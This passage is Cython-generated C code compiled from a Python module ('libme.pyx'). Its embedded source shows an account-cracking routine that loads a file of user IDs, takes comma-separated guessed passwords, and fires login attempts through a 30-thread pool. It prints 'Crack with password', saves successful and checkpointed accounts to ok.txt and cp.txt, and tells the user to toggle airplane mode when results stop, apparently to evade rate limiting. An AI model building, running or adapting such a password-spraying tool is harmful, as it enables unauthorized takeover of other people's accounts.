      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    /* "libme.pyx":764
 * 						coeg.submit(self.__file__, uid, pwx)
 * 	def __mennn__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			pastefile = input('  [+] Enter your file : ')
 * 			for line in open(pastefile, 'r').readlines():
 */
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  /* "libme.pyx":770
 * 		except(KeyError , IOError):
 * 			exit("\n [!] Your Path Wrong! Please Check File Path > %s "%(pastefile))
 * 		ask = input("  [!] Password method [y/t] : ")             # <<<<<<<<<<<<<<
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 */
  __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__53, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 770, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_v_ask = __pyx_t_4;
  __pyx_t_4 = 0;

  /* "libme.pyx":771
 * 			exit("\n [!] Your Path Wrong! Please Check File Path > %s "%(pastefile))
 * 		ask = input("  [!] Password method [y/t] : ")
 * 		if ask == "y":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For example Separators : 445566,786786786")
 */
  __pyx_t_13 = (__Pyx_PyString_Equals(__pyx_v_ask, __pyx_n_s_y, Py_EQ)); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 771, __pyx_L1_error)
  if (__pyx_t_13) {

    /* "libme.pyx":772
 * 		ask = input("  [!] Password method [y/t] : ")
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[*] For example Separators : 445566,786786786")
 * 				listpass = input("  [+] Enter Password : ")
 */
    /*with:*/ {
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 772, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_6 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 772, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 772, __pyx_L1_error)
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_empty_tuple, __pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 772, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_3 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 772, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_4 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_enter); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 772, __pyx_L14_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
        }
      }
      __pyx_t_6 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 772, __pyx_L14_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __pyx_t_6;
      __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      /*try:*/ {
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __Pyx_ExceptionSave(&__pyx_t_2, &__pyx_t_1, &__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_2);
          __Pyx_XGOTREF(__pyx_t_1);
          __Pyx_XGOTREF(__pyx_t_14);
          /*try:*/ {
            __pyx_v_coeg = __pyx_t_4;
            __pyx_t_4 = 0;

            /* "libme.pyx":773
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For example Separators : 445566,786786786")             # <<<<<<<<<<<<<<
 * 				listpass = input("  [+] Enter Password : ")
 * 				if len(listpass)<=5:
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_For_example_Separators_44) < 0) __PYX_ERR(0, 773, __pyx_L18_error)

            /* "libme.pyx":774
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For example Separators : 445566,786786786")
 * 				listpass = input("  [+] Enter Password : ")             # <<<<<<<<<<<<<<
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] Password Minimum 6 Characters")
 */
            __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__54, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 774, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_v_listpass = __pyx_t_4;
            __pyx_t_4 = 0;

            /* "libme.pyx":775
 * 				print("\n  \033[0;97m[*] For example Separators : 445566,786786786")
 * 				listpass = input("  [+] Enter Password : ")
 * 				if len(listpass)<=5:             # <<<<<<<<<<<<<<
 * 					exit("\n  [!] Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 */
            __pyx_t_7 = PyObject_Length(__pyx_v_listpass); if (unlikely(__pyx_t_7 == ((Py_ssize_t)-1))) __PYX_ERR(0, 775, __pyx_L18_error)
            __pyx_t_13 = ((__pyx_t_7 <= 5) != 0);
            if (__pyx_t_13) {

              /* "libme.pyx":776
 * 				listpass = input("  [+] Enter Password : ")
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] Password Minimum 6 Characters")             # <<<<<<<<<<<<<<
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
              __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__11, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 776, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

              /* "libme.pyx":775
 * 				print("\n  \033[0;97m[*] For example Separators : 445566,786786786")
 * 				listpass = input("  [+] Enter Password : ")
 * 				if len(listpass)<=5:             # <<<<<<<<<<<<<<
 * 					exit("\n  [!] Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 */
            }

            /* "libme.pyx":777
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")
 */
            __pyx_t_4 = __Pyx_PyString_FormatSafe(__pyx_kp_s_0_97m_Crack_with_password_0_91m, __pyx_v_listpass); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 777, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_4);
            if (__Pyx_PrintOne(0, __pyx_t_4) < 0) __PYX_ERR(0, 777, __pyx_L18_error)
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "libme.pyx":778
 * 					exit("\n  [!] Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")             # <<<<<<<<<<<<<<
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_Ok_result_saved_in_ok_txt) < 0) __PYX_ERR(0, 778, __pyx_L18_error)

            /* "libme.pyx":779
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")             # <<<<<<<<<<<<<<
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_Cp_result_saved_in_cp_txt) < 0) __PYX_ERR(0, 779, __pyx_L18_error)

            /* "libme.pyx":780
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")             # <<<<<<<<<<<<<<
 * 				for user in self.id:
 * 					uid, name = user.split("|")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_If_No_Result_Turn_On_Airplane_M) < 0) __PYX_ERR(0, 780, __pyx_L18_error)

            /* "libme.pyx":781
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:             # <<<<<<<<<<<<<<
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__file__,uid, listpass.split(","))
 */
            __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 781, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_4);
            if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
              __pyx_t_5 = __pyx_t_4; __Pyx_INCREF(__pyx_t_5); __pyx_t_7 = 0;
              __pyx_t_8 = NULL;
            } else {
              __pyx_t_7 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 781, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_8 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 781, __pyx_L18_error)
            }
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            for (;;) {
              if (likely(!__pyx_t_8)) {
                if (likely(PyList_CheckExact(__pyx_t_5))) {
                  if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_4 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 781, __pyx_L18_error)
                  #else
                  __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 781, __pyx_L18_error)
                  __Pyx_GOTREF(__pyx_t_4);
                  #endif
                } else {
                  if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 781, __pyx_L18_error)
                  #else
                  __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 781, __pyx_L18_error)
                  __Pyx_GOTREF(__pyx_t_4);
                  #endif
                }
              } else {
                __pyx_t_4 = __pyx_t_8(__pyx_t_5);
                if (unlikely(!__pyx_t_4)) {
                  PyObject* exc_type = PyErr_Occurred();
                  if (exc_type) {
                    if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                    else __PYX_ERR(0, 781, __pyx_L18_error)
                  }
                  break;
                }
                __Pyx_GOTREF(__pyx_t_4);
              }
              __Pyx_XDECREF_SET(__pyx_v_user, __pyx_t_4);
              __pyx_t_4 = 0;

              /* "libme.pyx":782
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:
 * 					uid, name = user.split("|")             # <<<<<<<<<<<<<<
 * 					coeg.submit(self.__file__,uid, listpass.split(","))
 * 		elif ask == "t":
 */
              __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_user, __pyx_n_s_split); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 782, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_6);
              __pyx_t_10 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
                __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_6);
                if (likely(__pyx_t_10)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                  __Pyx_INCREF(__pyx_t_10);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_6, function);
                }
              }
              __pyx_t_4 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_10, __pyx_kp_s__38) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_s__38);
              __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
              if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 782, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              if ((likely(PyTuple_CheckExact(__pyx_t_4))) || (PyList_CheckExact(__pyx_t_4))) {
                PyObject* sequence = __pyx_t_4;
                Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
                if (unlikely(size != 2)) {
                  if (size > 2) __Pyx_RaiseTooManyValuesError(2);
                  else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
                  __PYX_ERR(0, 782, __pyx_L18_error)
                }
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                if (likely(PyTuple_CheckExact(sequence))) {
                  __pyx_t_6 = PyTuple_GET_ITEM(sequence, 0); 
                  __pyx_t_10 = PyTuple_GET_ITEM(sequence, 1); 
                } else {
                  __pyx_t_6 = PyList_GET_ITEM(sequence, 0); 
                  __pyx_t_10 = PyList_GET_ITEM(sequence, 1); 
                }
                __Pyx_INCREF(__pyx_t_6);
                __Pyx_INCREF(__pyx_t_10);
                #else
                __pyx_t_6 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 782, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_10 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 782, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_10);
                #endif
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              } else {
                Py_ssize_t index = -1;
                __pyx_t_9 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 782, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_9);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __pyx_t_15 = Py_TYPE(__pyx_t_9)->tp_iternext;
                index = 0; __pyx_t_6 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_6)) goto __pyx_L27_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_6);
                index = 1; __pyx_t_10 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_10)) goto __pyx_L27_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_10);
                if (__Pyx_IternextUnpackEndCheck(__pyx_t_15(__pyx_t_9), 2) < 0) __PYX_ERR(0, 782, __pyx_L18_error)
                __pyx_t_15 = NULL;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                goto __pyx_L28_unpacking_done;
                __pyx_L27_unpacking_failed:;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                __pyx_t_15 = NULL;
                if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
                __PYX_ERR(0, 782, __pyx_L18_error)
                __pyx_L28_unpacking_done:;
              }
              __Pyx_XDECREF_SET(__pyx_v_uid, __pyx_t_6);
              __pyx_t_6 = 0;
              __Pyx_XDECREF_SET(__pyx_v_name, __pyx_t_10);
              __pyx_t_10 = 0;

              /* "libme.pyx":783
 * 				for user in self.id:
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__file__,uid, listpass.split(","))             # <<<<<<<<<<<<<<
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 */
              __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_coeg, __pyx_n_s_submit); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 783, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_10);
              __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_file); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 783, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_6);
              __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_v_listpass, __pyx_n_s_split); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 783, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_16);
              __pyx_t_17 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_16))) {
                __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_16);
                if (likely(__pyx_t_17)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
                  __Pyx_INCREF(__pyx_t_17);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_16, function);
                }
              }
              __pyx_t_9 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_16, __pyx_t_17, __pyx_kp_s__12) : __Pyx_PyObject_CallOneArg(__pyx_t_16, __pyx_kp_s__12);
              __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
              if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 783, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_9);
              __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
              __pyx_t_16 = NULL;
              __pyx_t_12 = 0;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
                __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_10);
                if (likely(__pyx_t_16)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
                  __Pyx_INCREF(__pyx_t_16);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_10, function);
                  __pyx_t_12 = 1;
                }
              }
              #if CYTHON_FAST_PYCALL
              if (PyFunction_Check(__pyx_t_10)) {
                PyObject *__pyx_temp[4] = {__pyx_t_16, __pyx_t_6, __pyx_v_uid, __pyx_t_9};
                __pyx_t_4 = __Pyx_PyFunction_FastCall(__pyx_t_10, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 783, __pyx_L18_error)
                __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              } else
              #endif
              #if CYTHON_FAST_PYCCALL
              if (__Pyx_PyFastCFunction_Check(__pyx_t_10)) {
                PyObject *__pyx_temp[4] = {__pyx_t_16, __pyx_t_6, __pyx_v_uid, __pyx_t_9};
                __pyx_t_4 = __Pyx_PyCFunction_FastCall(__pyx_t_10, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 783, __pyx_L18_error)
                __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              } else
              #endif
              {
                __pyx_t_17 = PyTuple_New(3+__pyx_t_12); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 783, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_17);
                if (__pyx_t_16) {
                  __Pyx_GIVEREF(__pyx_t_16); PyTuple_SET_ITEM(__pyx_t_17, 0, __pyx_t_16); __pyx_t_16 = NULL;
                }
                __Pyx_GIVEREF(__pyx_t_6);
                PyTuple_SET_ITEM(__pyx_t_17, 0+__pyx_t_12, __pyx_t_6);
                __Pyx_INCREF(__pyx_v_uid);
                __Pyx_GIVEREF(__pyx_v_uid);
                PyTuple_SET_ITEM(__pyx_t_17, 1+__pyx_t_12, __pyx_v_uid);
                __Pyx_GIVEREF(__pyx_t_9);
                PyTuple_SET_ITEM(__pyx_t_17, 2+__pyx_t_12, __pyx_t_9);
                __pyx_t_6 = 0;
                __pyx_t_9 = 0;
                __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_t_17, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 783, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              }
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

              /* "libme.pyx":781
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:             # <<<<<<<<<<<<<<
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__file__,uid, listpass.split(","))
 */
            }
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "libme.pyx":772
 * 		ask = input("  [!] Password method [y/t] : ")
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[*] For example Separators : 445566,786786786")
 * 				listpass = input("  [+] Enter Password : ")
 */
          }
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          goto __pyx_L23_try_end;
          __pyx_L18_error:;
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          /*except:*/ {
            __Pyx_AddTraceback("libme.James.__mennn__", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_4, &__pyx_t_10) < 0) __PYX_ERR(0, 772, __pyx_L20_except_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_17 = PyTuple_Pack(3, __pyx_t_5, __pyx_t_4, __pyx_t_10); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 772, __pyx_L20_except_error)
            __Pyx_GOTREF(__pyx_t_17);
            __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_17, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 772, __pyx_L20_except_error)
            __Pyx_GOTREF(__pyx_t_18);
            __pyx_t_13 = __Pyx_PyObject_IsTrue(__pyx_t_18);
            __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            if (__pyx_t_13 < 0) __PYX_ERR(0, 772, __pyx_L20_except_error)
            __pyx_t_19 = ((!(__pyx_t_13 != 0)) != 0);
            if (__pyx_t_19) {
              __Pyx_GIVEREF(__pyx_t_5);
              __Pyx_GIVEREF(__pyx_t_4);
              __Pyx_XGIVEREF(__pyx_t_10);
              __Pyx_ErrRestoreWithState(__pyx_t_5, __pyx_t_4, __pyx_t_10);
              __pyx_t_5 = 0; __pyx_t_4 = 0; __pyx_t_10 = 0; 
              __PYX_ERR(0, 772, __pyx_L20_except_error)
            }
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            goto __pyx_L19_exception_handled;
          }
          __pyx_L20_except_error:;
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_ExceptionReset(__pyx_t_2, __pyx_t_1, __pyx_t_14);
          goto __pyx_L1_error;
          __pyx_L19_exception_handled:;
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_ExceptionReset(__pyx_t_2, __pyx_t_1, __pyx_t_14);
          __pyx_L23_try_end:;
        }
      }
      /*finally:*/ {
        /*normal exit:*/{
          if (__pyx_t_3) {
            __pyx_t_14 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__13, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 772, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          }
          goto __pyx_L17;
        }
        __pyx_L17:;
      }
      goto __pyx_L32;
      __pyx_L14_error:;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L1_error;
      __pyx_L32:;
    }

    /* "libme.pyx":771
 * 			exit("\n [!] Your Path Wrong! Please Check File Path > %s "%(pastefile))
 * 		ask = input("  [!] Password method [y/t] : ")
 * 		if ask == "y":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For example Separators : 445566,786786786")
 */
    goto __pyx_L13;
  }

  /* "libme.pyx":784
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__file__,uid, listpass.split(","))
 * 		elif ask == "t":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
  __pyx_t_19 = (__Pyx_PyString_Equals(__pyx_v_ask, __pyx_n_s_t, Py_EQ)); if (unlikely(__pyx_t_19 < 0)) __PYX_ERR(0, 784, __pyx_L1_error)
  if (__pyx_t_19) {

    /* "libme.pyx":785
 * 					coeg.submit(self.__file__,uid, listpass.split(","))
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")
 */
    /*with:*/ {
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 785, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 785, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 785, __pyx_L1_error)
